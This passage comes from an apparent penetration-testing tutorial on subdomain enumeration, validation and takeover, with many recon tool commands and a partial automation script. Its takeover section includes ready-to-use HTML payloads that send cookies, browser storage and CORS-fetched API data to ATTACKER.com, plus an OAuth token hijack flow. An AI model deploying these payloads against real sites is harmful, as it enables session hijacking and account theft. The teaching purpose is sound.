    --wildcard-batch 1000000 \
    -w puredns.txt

  # Installation
  go install -v github.com/d3mondev/puredns/v2@latest
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="shuffledns"}
  ```bash [Terminal]
  # shuffledns - massdns wrapper with wildcard filtering

  # Brute force mode
  shuffledns -d example.com \
    -w wordlist.txt \
    -r resolvers.txt \
    -o shuffledns.txt

  # Resolve mode (validate collected subdomains)
  shuffledns -d example.com \
    -list all_subdomains.txt \
    -r resolvers.txt \
    -o shuffledns_resolved.txt

  # With custom massdns
  shuffledns -d example.com \
    -w wordlist.txt \
    -r resolvers.txt \
    -m /usr/local/bin/massdns \
    -o shuffledns.txt

  # Installation
  go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="massdns"}
  ```bash [Terminal]
  # massdns - High performance DNS stub resolver

  # Prepare subdomain list
  cat wordlist.txt | sed "s/$/.example.com/" > to_resolve.txt

  # Resolve
  massdns -r resolvers.txt \
    -t A \
    -o S \
    -w massdns_results.txt \
    to_resolve.txt

  # Parse results
  cat massdns_results.txt | \
    awk '{print $1}' | sed 's/\.$//' | sort -u > massdns_subs.txt

  # JSON output
  massdns -r resolvers.txt \
    -t A \
    -o J \
    -w massdns.json \
    to_resolve.txt

  # Installation
  git clone https://github.com/blechschmidt/massdns.git
  cd massdns && make
  sudo cp bin/massdns /usr/local/bin/
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="gobuster"}
  ```bash [Terminal]
  # gobuster DNS mode (pre-installed on Kali)

  # Basic DNS brute force
  gobuster dns -d example.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -t 50 \
    -o gobuster.txt

  # With wildcard detection
  gobuster dns -d example.com \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
    -t 100 \
    --wildcard \
    -o gobuster.txt

  # Show CNAME records
  gobuster dns -d example.com \
    -w wordlist.txt \
    -t 50 \
    --show-cname \
    -o gobuster_cname.txt

  # Custom resolver
  gobuster dns -d example.com \
    -w wordlist.txt \
    -r 8.8.8.8 \
    -o gobuster.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ffuf"}
  ```bash [Terminal]
  # ffuf - Virtual host / subdomain brute forcing via HTTP

  # Subdomain brute force
  ffuf -u "https://FUZZ.example.com" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200,301,302,403,500 \
    -o ffuf_subs.json -of json

  # Virtual host brute force via Host header
  ffuf -u "http://TARGET_IP" \
    -H "Host: FUZZ.example.com" \
    -w wordlist.txt \
    -fs 0 \
    -mc all \
    -o ffuf_vhosts.json

  # Filter by response size (remove false positives)
  ffuf -u "https://FUZZ.example.com" \
    -w wordlist.txt \
    -fs 1234 \
    -o ffuf_filtered.json

  # Filter by word count
  ffuf -u "https://FUZZ.example.com" \
    -w wordlist.txt \
    -fw 42 \
    -o ffuf_fw.json

  # Auto-calibration (auto-detect and filter false positives)
  ffuf -u "https://FUZZ.example.com" \
    -w wordlist.txt \
    -ac \
    -o ffuf_auto.json
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="wfuzz"}
  ```bash [Terminal]
  # wfuzz - Pre-installed on Kali Linux

  # Subdomain brute force
  wfuzz -c -Z \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -u "https://FUZZ.example.com" \
    --hc 404 \
    -f wfuzz_results.txt

  # Virtual host enumeration
  wfuzz -c -Z \
    -w wordlist.txt \
    -H "Host: FUZZ.example.com" \
    -u "http://TARGET_IP" \
    --hh 1234 \
    -f wfuzz_vhosts.txt

  # Hide by response size
  wfuzz -c -Z \
    -w wordlist.txt \
    -u "https://FUZZ.example.com" \
    --hl 7 \
    -f wfuzz_filtered.txt
  ```
  :::
::

### Wordlists

::collapsible

```txt [Best Wordlists for DNS Brute Forcing]
# ============ SecLists (Pre-installed on Kali) ============
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt          # Quick scan
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt         # Medium scan
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt        # Full scan
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt        # Alternative top 100k
/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt                          # Jason Haddix compilation (2M+)
/usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt      # Deep Magic top 50k
/usr/share/seclists/Discovery/DNS/combined_subdomains.txt                  # Combined wordlist
/usr/share/seclists/Discovery/DNS/fierce-hostlist.txt                      # Fierce default
/usr/share/seclists/Discovery/DNS/namelist.txt                             # Name-based
/usr/share/seclists/Discovery/DNS/shubs-stackoverflow.txt                  # Stack Overflow scraped
/usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt

# ============ Assetnote (Download) ============
# https://wordlists.assetnote.io/
best-dns-wordlist.txt                                                      # Best curated list
httparchive_subdomains_2024_01_28.txt                                      # From HTTP Archive crawl

# ============ Custom Patterns ============
# Common high-value targets to always include:
admin
api
api-v1
api-v2
api-gateway
app
auth
backend
beta
blog
cdn
ci
cms
console
cpanel
dashboard
data
db
demo
deploy
dev
developer
devops
dns
docs
email
files
ftp
gateway
git
gitlab
gql
grafana
graphql
help
helpdesk
hub
images
internal
intranet
jenkins
jira
k8s
kafka
kibana
ldap
legacy
login
logs
mail
manage
media
metrics
monitor
mysql
new
next
ns1
ns2
old
ops
panel
payments
phpmyadmin
portal
postgres
preprod
preview
prod
production
prometheus
proxy
qa
queue
rabbitmq
redis
redmine
registry
remote
repo
rest
sentry
sftp
smtp
sonar
sso
stage
staging
static
status
stg
support
svn
sync
syslog
test
testing
tools
uat
vault
vpn
webmail
wiki
ws
www
```

::

### DNS Permutation & Alteration

Generate **variations** of known subdomains to discover related hosts.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="altdns"}
  ```bash [Terminal]
  # altdns - Generate subdomain permutations

  # Generate permutations from known subdomains
  altdns -i known_subdomains.txt \
    -o permutations.txt \
    -w /usr/share/altdns/words.txt

  # Generate and resolve
  altdns -i known_subdomains.txt \
    -o permutations.txt \
    -w /usr/share/altdns/words.txt \
    -r -s resolved_perms.txt

  # Installation
  pip3 install py-altdns
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="dnsgen"}
  ```bash [Terminal]
  # dnsgen - Generate domain name combinations

  # Generate permutations
  cat known_subdomains.txt | dnsgen - > dnsgen_perms.txt

  # Generate and resolve with massdns
  cat known_subdomains.txt | dnsgen - | \
    massdns -r resolvers.txt -t A -o S -w dnsgen_resolved.txt

  # With puredns
  cat known_subdomains.txt | dnsgen - | \
    puredns resolve --resolvers resolvers.txt -w dnsgen_alive.txt

  # With custom wordlist
  cat known_subdomains.txt | dnsgen -w custom_words.txt - > dnsgen_custom.txt

  # Installation
  pip3 install dnsgen
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="gotator"}
  ```bash [Terminal]
  # gotator - Fast subdomain permutation tool

  # Generate permutations
  gotator -sub known_subdomains.txt \
    -perm /usr/share/altdns/words.txt \
    -depth 1 \
    -numbers 3 \
    -md > gotator_perms.txt

  # Depth 2 (more combinations)
  gotator -sub known_subdomains.txt \
    -perm words.txt \
    -depth 2 \
    -numbers 5 \
    -md > gotator_deep.txt

  # Pipe to puredns
  gotator -sub known_subdomains.txt -perm words.txt -depth 1 -md | \
    puredns resolve --resolvers resolvers.txt -w gotator_resolved.txt

  # Installation
  go install -v github.com/Josue87/gotator@latest
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Permutation Words"}
  ```txt [words.txt]
  # Common permutation words
  dev
  development
  stage
  staging
  stg
  prod
  production
  test
  testing
  qa
  uat
  sandbox
  demo
  beta
  alpha
  canary
  preview
  pre
  preprod
  pre-prod
  internal
  int
  ext
  external
  public
  private
  old
  new
  legacy
  next
  v1
  v2
  v3
  api
  app
  web
  www
  admin
  backend
  frontend
  back
  front
  auth
  login
  sso
  portal
  panel
  dashboard
  manage
  management
  mgmt
  monitor
  monitoring
  log
  logs
  data
  db
  database
  cache
  redis
  elastic
  search
  mail
  email
  smtp
  pop
  imap
  vpn
  proxy
  cdn
  static
  assets
  media
  images
  img
  files
  upload
  docs
  doc
  help
  support
  status
  health
  metrics
  ci
  cd
  deploy
  build
  release
  git
  repo
  jenkins
  gitlab
  jira
  confluence
  grafana
  kibana
  prometheus
  ```
  :::
::

::tip
**The permutation workflow**: Collect subdomains passively → Feed known subdomains to dnsgen/altdns/gotator → Resolve permutations → Discover subdomains that pure brute forcing misses. This technique often finds `staging-api`, `dev-portal`, `internal-admin` patterns.
::

### DNS Zone Transfer

::caution
Zone transfers expose the **entire DNS zone** including internal records. A successful zone transfer is typically a **high/critical severity** finding. Most modern DNS servers block unauthorized AXFR requests.
::

```bash [Terminal]
# Find nameservers
dig NS example.com +short

# Attempt zone transfer against each nameserver
for ns in $(dig NS example.com +short); do
  echo "============================================"
  echo "[*] Attempting AXFR on: $ns"
  echo "============================================"
  dig axfr example.com @"$ns"
done

# Using host command
host -t axfr example.com ns1.example.com

# Using dnsrecon (Kali)
dnsrecon -d example.com -t axfr

# Using dnsenum (Kali)
dnsenum --enum example.com

# Using fierce (Kali)
fierce --domain example.com

# Using nmap
nmap --script dns-zone-transfer -p 53 ns1.example.com
```

### Wildcard Detection

::warning
**Wildcard DNS** returns a valid response for **any** subdomain query. This creates massive false positives. Always detect wildcards before brute forcing.
::

```bash [Terminal]
# Test for wildcard DNS
echo "[*] Testing for wildcard DNS..."

RANDOM_SUB1="randomnonexistent$(date +%s)test"
RANDOM_SUB2="anotherfakehost$(date +%s)check"

RESULT1=$(dig +short A "$RANDOM_SUB1.example.com")
RESULT2=$(dig +short A "$RANDOM_SUB2.example.com")

echo "Test 1 ($RANDOM_SUB1): $RESULT1"
echo "Test 2 ($RANDOM_SUB2): $RESULT2"

if [ -n "$RESULT1" ] && [ "$RESULT1" = "$RESULT2" ]; then
  echo "[!] WILDCARD DNS DETECTED: $RESULT1"
  echo "[!] Filter IP $RESULT1 from brute force results"
  echo "[*] Use tools with wildcard detection: puredns, shuffledns"
else
  echo "[+] No wildcard DNS detected - safe to brute force"
fi

# Check CNAME wildcard
CNAME_WILD=$(dig +short CNAME "$RANDOM_SUB1.example.com")
if [ -n "$CNAME_WILD" ]; then
  echo "[!] CNAME wildcard detected: $CNAME_WILD"
fi
```

### Virtual Host Discovery

Some subdomains are not in DNS but respond to specific **Host headers** on shared web servers.

```bash [Terminal]
# ffuf vhost discovery
ffuf -u "http://TARGET_IP" \
  -H "Host: FUZZ.example.com" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -ac \
  -o vhosts.json -of json

# gobuster vhost mode
gobuster vhost -u "http://TARGET_IP" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -d example.com \
  -o gobuster_vhosts.txt

# wfuzz vhost discovery (Kali)
wfuzz -c -Z \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.example.com" \
  -u "http://TARGET_IP" \
  --hh 1234 \
  -f wfuzz_vhosts.txt

# Manual check
curl -s -o /dev/null -w "%{http_code}" -H "Host: dev.example.com" http://TARGET_IP
```

---

## Resolution & Validation

After collecting from all sources, **resolve**, **validate**, and **probe** all discovered subdomains.

::steps{level="3"}

### Merge All Results

```bash [Terminal]
# Combine all passive and active results
cat \
  subfinder.txt \
  sublist3r.txt \
  amass_passive.txt \
  crtsh_subs.txt \
  securitytrails.txt \
  virustotal.txt \
  otx.txt \
  hackertarget.txt \
  rapiddns.txt \
  wayback.txt \
  gau_subs.txt \
  github_subs.txt \
  shodan_subs.txt \
  puredns.txt \
  gobuster.txt \
  dnsgen_alive.txt \
  2>/dev/null | \
  sort -u | \
  grep -v "^\*" > all_subdomains.txt

echo "[+] Total unique subdomains: $(wc -l < all_subdomains.txt)"
```

### DNS Resolution

```bash [Terminal]
# dnsx - Batch DNS resolution
cat all_subdomains.txt | dnsx -silent -a -resp -o dnsx_resolved.txt
cat all_subdomains.txt | dnsx -silent -a -aaaa -cname -mx -resp -o dnsx_full.txt

# Extract CNAME records (important for takeover)
cat all_subdomains.txt | dnsx -silent -cname -resp-only -o cnames.txt

# massdns resolution
massdns -r resolvers.txt -t A -o S -w massdns_resolved.txt all_subdomains.txt
```

### HTTP Probing

```bash [Terminal]
# httpx - Check alive HTTP(S) services
cat all_subdomains.txt | httpx -silent \
  -status-code \
  -title \
  -tech-detect \
  -follow-redirects \
  -content-length \
  -web-server \
  -ip \
  -cname \
  -cdn \
  -o httpx_alive.txt

# JSON output for detailed analysis
cat all_subdomains.txt | httpx -silent -json \
  -status-code -title -tech-detect -ip -cname \
  -o httpx.json

# httprobe (simpler alternative)
cat all_subdomains.txt | httprobe -c 100 | tee httprobe_alive.txt

# Check specific ports
cat all_subdomains.txt | httpx -silent -ports 80,443,8080,8443,8000,3000,9090 \
  -status-code -title -o httpx_ports.txt
```

### Screenshots

```bash [Terminal]
# gowitness screenshots
cat httpx_alive.txt | awk '{print $1}' | \
  gowitness scan file -f - --screenshot-path ./screenshots/

# aquatone screenshots and report
cat httpx_alive.txt | awk '{print $1}' | aquatone -out ./aquatone_report

# eyewitness (Kali pre-installed)
eyewitness -f httpx_alive.txt --web -d ./eyewitness_report

# Open reports
firefox ./aquatone_report/aquatone_report.html &
firefox ./eyewitness_report/report.html &
```

::

---

## Subdomain Takeover (Privilege Escalation)

Subdomain takeover happens when a subdomain's DNS record points to a **deprovisioned external service**. An attacker claims that service and controls content served under the **trusted domain**.

::note
Subdomain takeover is a **direct privilege escalation** path because it enables:

- **Cookie theft** — cookies scoped to `.example.com` are sent to the taken-over subdomain
- **Session hijacking** — steal authentication tokens via shared cookie scope
- **CORS bypass** — if `*.example.com` is whitelisted in CORS headers
- **CSP bypass** — if `*.example.com` is in Content Security Policy
- **OAuth callback hijack** — redirect OAuth tokens to attacker-controlled subdomain
- **Phishing** — serve phishing pages under the trusted legitimate domain
- **Email interception** — MX record takeover to receive organization emails
::

### How Takeover Works

::steps{level="4"}

#### Target Provisions Cloud Service

Organization creates `blog.example.com` → CNAME → `example.ghost.io`

The Ghost blog is active and serving content.

#### Service Gets Deprovisioned

Team cancels the Ghost subscription or removes the custom domain configuration.

The CNAME record `blog.example.com` → `example.ghost.io` **remains in DNS** (dangling record).

#### Attacker Identifies Dangling Record

```bash [Terminal]
dig CNAME blog.example.com +short
# Returns: example.ghost.io

curl -s -o /dev/null -w "%{http_code}" https://blog.example.com
# Returns: 404 or specific error page indicating unclaimed service
```

#### Attacker Claims the Service

Attacker creates a Ghost account and configures `example.ghost.io` as their blog.

#### Content Served Under Target Domain

`blog.example.com` now serves attacker-controlled content with the trust of `example.com`.

::

### Takeover Detection Tools

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="nuclei"}
  ```bash [Terminal]
  # nuclei with takeover templates (BEST option)
  cat all_subdomains.txt | nuclei \
    -t ~/nuclei-templates/http/takeovers/ \
    -c 100 \
    -o nuclei_takeover.txt

  # Severity filter
  cat all_subdomains.txt | nuclei \
    -tags takeover \
    -severity critical,high \
    -o takeover_critical.txt

  # With rate limiting
  cat all_subdomains.txt | nuclei \
    -t ~/nuclei-templates/http/takeovers/ \
    -rl 100 \
    -c 50 \
    -o nuclei_takeover.txt

  # Update templates first
  nuclei -update-templates
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="subzy"}
  ```bash [Terminal]
  # subzy - Modern subdomain takeover checker
  subzy run --targets all_subdomains.txt \
    --concurrency 100 \
    --hide_fails \
    --output subzy_results.txt

  # With HTTPS verification
  subzy run --targets all_subdomains.txt \
    --verify_ssl \
    --output subzy_verified.txt

  # Installation
  go install -v github.com/PentestPad/subzy@latest
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Subdominator"}
  ```bash [Terminal]
  # Subdominator - 100+ service fingerprints
  subdominator -l all_subdomains.txt -o subdominator_results.txt

  # With threads
  subdominator -l all_subdomains.txt -t 50 -o subdominator.txt

  # Installation
  pip3 install git+https://github.com/RevoltSecurities/Subdominator.git
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="subjack"}
  ```bash [Terminal]
  # subjack - Subdomain takeover tool
  subjack -w all_subdomains.txt \
    -t 100 \
    -timeout 30 \
    -ssl \
    -c /opt/subjack/fingerprints.json \
    -v \
    -o subjack_results.txt

  # Installation
  go install -v github.com/haccer/subjack@latest
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Manual CNAME Check"}
  ```bash [Terminal]
  #!/bin/bash
  # Manual CNAME takeover fingerprint check

  echo "[*] Extracting CNAME records..."

  while read sub; do
    cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1 | sed 's/\.$//')
    if [ -n "$cname" ]; then
      echo "$sub -> $cname"
    fi
  done < all_subdomains.txt | tee cname_map.txt

  echo ""
  echo "[*] Checking for vulnerable CNAME patterns..."
  echo "============================================"

  grep -iE \
    "(s3\.amazonaws\.com|s3-website|\.github\.io|\.herokuapp\.com|\.herokussl\.com|\.azurewebsites\.net|\.cloudapp\.net|\.trafficmanager\.net|\.blob\.core\.windows\.net|\.azure-api\.net|\.azurefd\.net|\.cloudfront\.net|\.myshopify\.com|\.shopify\.com|fastly|\.pantheonsite\.io|\.tumblr\.com|\.wordpress\.com|\.surge\.sh|\.bitbucket\.io|\.ghost\.io|\.netlify\.(app|com)|\.vercel\.app|\.fly\.dev|\.cargocollective\.com|\.helpjuice\.com|\.helpscout\.(net|com)|\.aftership\.com|\.aha\.io|\.brightcove\.com|\.bigcartel\.com|\.campaignmonitor\.com|\.acquia-test\.co|\.proposify\.com|\.simplebooklet\.com|\.getresponse\.com|\.vend\.com|\.readme\.io|\.statuspage\.io|\.intercom\.(com|io)|\.webflow\.io|\.kajabi\.com|\.thinkific\.com|\.wishpond\.com|\.ngrok\.io|\.kinsta\.cloud|\.launchrock\.com|\.pingdom\.com|\.tictail\.com|\.uberflip\.com|\.uservoice\.com|\.zendesk\.com|\.freshdesk\.com|\.teamwork\.com|\.smugmug\.com|\.strikingly\.com|\.tilda\.(ws|cc)|\.creatorlink\.net|\.airee\.ru|\.wix\.com|\.squarespace\.com)" \
    cname_map.txt | while read line; do
      echo "[!] POTENTIAL TAKEOVER: $line"
    done
  ```
  :::
::

### Vulnerable Services Fingerprints

| Service | CNAME Pattern | Error Fingerprint | Status |
| ------- | ------------- | ----------------- | ------ |
| **AWS S3** | `*.s3.amazonaws.com` | `NoSuchBucket` | ✅ Vulnerable |
| **GitHub Pages** | `*.github.io` | `There isn't a GitHub Pages site here` | ✅ Vulnerable |
| **Heroku** | `*.herokuapp.com` | `No such app` | ✅ Vulnerable |
| **Azure Web** | `*.azurewebsites.net` | `404 Web Site not found` | ✅ Vulnerable |
| **Azure Traffic** | `*.trafficmanager.net` | `NXDOMAIN` | ✅ Vulnerable |
| **Azure CDN** | `*.azureedge.net` | `404 page not found` | ✅ Vulnerable |
| **Shopify** | `*.myshopify.com` | `Sorry, this shop is currently unavailable` | ✅ Vulnerable |
| **Fastly** | `*.fastly.net` | `Fastly error: unknown domain` | ✅ Vulnerable |
| **Pantheon** | `*.pantheonsite.io` | `404 error unknown site` | ✅ Vulnerable |
| **Tumblr** | `*.tumblr.com` | `There's nothing here` | ✅ Vulnerable |
| **WordPress** | `*.wordpress.com` | `Do you want to register` | ✅ Vulnerable |
| **Ghost** | `*.ghost.io` | `The thing you were looking for is no longer here` | ✅ Vulnerable |
| **Surge.sh** | `*.surge.sh` | `project not found` | ✅ Vulnerable |
| **Netlify** | `*.netlify.app` | `Not Found - Request ID` | ✅ Vulnerable |
| **Vercel** | `*.vercel.app` | `404: NOT_FOUND` | ✅ Vulnerable |
| **Fly.io** | `*.fly.dev` | `404 Not Found` | ✅ Vulnerable |
| **Cargo** | `*.cargocollective.com` | `404 Not Found` | ✅ Vulnerable |
| **Bitbucket** | `*.bitbucket.io` | `Repository not found` | ✅ Vulnerable |
| **Zendesk** | `*.zendesk.com` | `Help Center Closed` | ✅ Vulnerable |
| **Freshdesk** | `*.freshdesk.com` | `There is no helpdesk here!` | ✅ Vulnerable |
| **Readme.io** | `*.readme.io` | `Project doesnt exist` | ✅ Vulnerable |
| **StatusPage** | `*.statuspage.io` | `Status page launched` | ✅ Vulnerable |
| **Intercom** | `*.intercom.io` | `Uh oh. That page doesn't exist` | ✅ Vulnerable |
| **Webflow** | `*.webflow.io` | `The page you are looking for doesn't exist` | ✅ Vulnerable |
| **Kajabi** | `*.kajabi.com` | `The page you were looking for doesn't exist` | ✅ Vulnerable |
| **Tilda** | `*.tilda.ws` | `Please renew your subscription` | ✅ Vulnerable |
| **Strikingly** | `*.strikinglydns.com` | `page not found` | ✅ Vulnerable |
| **Kinsta** | `*.kinsta.cloud` | `No Site For Domain` | ✅ Vulnerable |
| **Ngrok** | `*.ngrok.io` | `Tunnel not found` | ✅ Vulnerable |
| **CloudFront** | `*.cloudfront.net` | `Bad Request: ERROR: The request could not be satisfied` | ⚠️ Edge Case |
| **Google Cloud** | `*.storage.googleapis.com` | `NoSuchBucket` | ⚠️ Edge Case |

### PrivEsc: Cookie Theft

::caution
Cookies set with `Domain=.example.com` are automatically sent to **every subdomain**, including any subdomain you take over. This enables **session hijacking** and **account takeover**.
::

```html [cookie-stealer.html]
<!-- Deploy on taken-over subdomain -->
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
  // Steal cookies scoped to .example.com
  var data = {
    cookies: document.cookie,
    url: window.location.href,
    referrer: document.referrer,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  };

  // Exfiltrate via image beacon
  var img = new Image();
  img.src = "https://ATTACKER.com/log?d=" + btoa(JSON.stringify(data));

  // Exfiltrate via fetch
  fetch("https://ATTACKER.com/exfil", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(data)
  });
</script>
<h1>Page is loading...</h1>
</body>
</html>
```

### PrivEsc: OAuth Callback Hijack

```txt [Attack Flow]
1. Application uses OAuth login with callback URL:
   https://auth.example.com/oauth/callback

2. auth.example.com has dangling CNAME → deprovisioned service

3. Attacker takes over auth.example.com

4. Attacker crafts OAuth authorization URL:
   https://accounts.google.com/o/oauth2/auth?
     client_id=TARGET_CLIENT_ID&
     redirect_uri=https://auth.example.com/oauth/callback&
     response_type=code&
     scope=openid+email+profile

5. Victim clicks link → authenticates with Google

6. OAuth code/token redirected to auth.example.com (attacker-controlled)

7. Attacker captures OAuth token → accesses victim's account

IMPACT: Full Account Takeover via OAuth token theft
```

### PrivEsc: CORS Bypass

```bash [Terminal]
# Check if target has wildcard subdomain CORS
curl -s -I -H "Origin: https://evil.example.com" https://api.example.com/user | \
  grep -i "access-control"

# If response contains:
# Access-Control-Allow-Origin: https://evil.example.com
# Access-Control-Allow-Credentials: true
# → Subdomain takeover enables CORS bypass to steal API data
```

```html [cors-steal.html]
<!-- Deploy on taken-over subdomain -->
<script>
  // If *.example.com is in CORS whitelist
  fetch("https://api.example.com/api/user/profile", {
    credentials: "include"
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate user data
    fetch("https://ATTACKER.com/cors-loot", {
      method: "POST",
      body: JSON.stringify(data)
    });
  });
</script>
```

---

## Automation Pipeline

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Full Bash Pipeline"}
  ::code-collapse
  ```bash [recon_subdomains.sh]
  #!/bin/bash
  #============================================================
  # Complete Subdomain Enumeration Pipeline
  # Usage: ./recon_subdomains.sh example.com
  #============================================================

  TARGET=$1
  DATE=$(date +%Y%m%d_%H%M%S)
  OUTPUT="recon_${TARGET}_${DATE}"
  RESOLVERS="$HOME/resolvers.txt"
  WORDLIST="$HOME/wordlists/best-dns-wordlist.txt"
  THREADS=100

  RED='\033[0;31m'
  GREEN='\033[0;32m'
  YELLOW='\033[1;33m'
  BLUE='\033[0;34m'
  NC='\033[0m'

  if [ -z "$TARGET" ]; then
    echo -e "${RED}Usage: $0 <domain>${NC}"
    exit 1
  fi

  mkdir -p "$OUTPUT"/{passive,active,resolved,takeover,screenshots,reports}
  echo -e "${BLUE}[*] Target: $TARGET${NC}"
  echo -e "${BLUE}[*] Output: $OUTPUT/${NC}"
  echo ""

  #============================================================
  # PHASE 1: PASSIVE ENUMERATION
  #============================================================
  echo -e "${GREEN}[PHASE 1] Passive Enumeration${NC}"
  echo "============================================"

  # Subfinder
  echo -e "${YELLOW}[+] Running subfinder...${NC}"
  subfinder -d "$TARGET" -all -silent -o "$OUTPUT/passive/subfinder.txt" 2>/dev/null
  echo "    Found: $(wc -l < "$OUTPUT/passive/subfinder.txt" 2>/dev/null || echo 0)"

  # Amass passive
  echo -e "${YELLOW}[+] Running amass passive...${NC}"
  timeout 600 amass enum -passive -d "$TARGET" -o "$OUTPUT/passive/amass.txt" 2>/dev/null
  echo "    Found: $(wc -l < "$OUTPUT/passive/amass.txt" 2>/dev/null || echo 0)"

  # Assetfinder
  echo -e "${YELLOW}[+] Running assetfinder...${NC}"
  assetfinder --subs-only "$TARGET" 2>/dev/null | sort -u > "$OUTPUT/passive/assetfinder.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/assetfinder.txt" 2>/dev/null || echo 0)"

  # Findomain
  echo -e "${YELLOW}[+] Running findomain...${NC}"
  findomain -t "$TARGET" -u "$OUTPUT/passive/findomain.txt" 2>/dev/null
  echo "    Found: $(wc -l < "$OUTPUT/passive/findomain.txt" 2>/dev/null || echo 0)"

  # crt.sh
  echo -e "${YELLOW}[+] Querying crt.sh...${NC}"
  curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | \
    jq -r '.[].name_value' 2>/dev/null | \
    sed 's/\*\.//g' | sort -u > "$OUTPUT/passive/crtsh.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/crtsh.txt" 2>/dev/null || echo 0)"

  # AlienVault OTX
  echo -e "${YELLOW}[+] Querying AlienVault OTX...${NC}"
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$TARGET/passive_dns" 2>/dev/null | \
    jq -r '.passive_dns[].hostname' 2>/dev/null | \
    sort -u | grep "$TARGET" > "$OUTPUT/passive/otx.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/otx.txt" 2>/dev/null || echo 0)"

  # HackerTarget
  echo -e "${YELLOW}[+] Querying HackerTarget...${NC}"
  curl -s "https://api.hackertarget.com/hostsearch/?q=$TARGET" 2>/dev/null | \
    cut -d',' -f1 | sort -u > "$OUTPUT/passive/hackertarget.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/hackertarget.txt" 2>/dev/null || echo 0)"

  # RapidDNS
  echo -e "${YELLOW}[+] Querying RapidDNS...${NC}"
  curl -s "https://rapiddns.io/subdomain/$TARGET?full=1#result" 2>/dev/null | \
    grep -oP '_blank">\K[^<]*' | grep -v http | sort -u > "$OUTPUT/passive/rapiddns.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/rapiddns.txt" 2>/dev/null || echo 0)"

  # Wayback Machine
  echo -e "${YELLOW}[+] Querying Wayback Machine...${NC}"
  curl -s "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey" 2>/dev/null | \
    sed 's|https\?://||' | cut -d'/' -f1 | sort -u > "$OUTPUT/passive/wayback.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/wayback.txt" 2>/dev/null || echo 0)"

  # GAU
  echo -e "${YELLOW}[+] Running gau...${NC}"
  echo "$TARGET" | gau --subs 2>/dev/null | unfurl --unique domains 2>/dev/null | \
    grep "$TARGET" | sort -u > "$OUTPUT/passive/gau.txt"
  echo "    Found: $(wc -l < "$OUTPUT/passive/gau.txt" 2>/dev/null || echo 0)"

  # Merge passive results
  cat "$OUTPUT"/passive/*.txt 2>/dev/null | \
    grep -v "^\*" | sed 's/\*\.//g' | \
    grep -E "^[a-zA-Z0-9]" | grep "\.$TARGET$\|^$TARGET$" | \
    sort -u > "$OUTPUT/passive_all.txt"
  echo ""
  echo -e "${GREEN}[+] Total passive: $(wc -l < "$OUTPUT/passive_all.txt") unique subdomains${NC}"

  #============================================================
  # PHASE 2: ACTIVE ENUMERATION
  #============================================================
  echo ""
  echo -e "${GREEN}[PHASE 2] Active Enumeration${NC}"
  echo "============================================"

  # DNS brute force with puredns
  if [ -f "$WORDLIST" ] && [ -f "$RESOLVERS" ]; then
    echo -e "${YELLOW}[+] Running puredns bruteforce...${NC}"
    puredns bruteforce "$WORDLIST" "$TARGET" \
      --resolvers "$RESOLVERS" \
      --rate-limit 500 \
      -w "$OUTPUT/active/bruteforce.txt" 2>/dev/null
    echo "    Found: $(wc -l < "$OUTPUT/active/bruteforce.txt" 2>/dev/null || echo 0)"
  fi

  # DNS permutations with dnsgen
  echo -e "${YELLOW}[+] Running dnsgen permutations...${NC}"
  cat "$OUTPUT/passive_all.txt" | dnsgen - 2>/dev/null | head -500000 | \
    puredns resolve --resolvers "$RESOLVERS" \
    -w "$OUTPUT/active/permutations.txt" 2>/dev/null
  echo "    Found: $(wc -l < "$OUTPUT/active/permutations.txt" 2>/dev/null || echo 0)"

  # Merge all results
  cat "$OUTPUT/passive_all.txt" "$OUTPUT"/active/*.txt 2>/dev/null | \
    sort -u > "$OUTPUT/all_subdomains.txt"
  echo ""
  echo -e "${GREEN}[+] Total combined: $(wc -l < "$OUTPUT/all_subdomains.txt") unique subdomains${NC}"

  #============================================================
  # PHASE 3: RESOLUTION & VALIDATION
  #============================================================
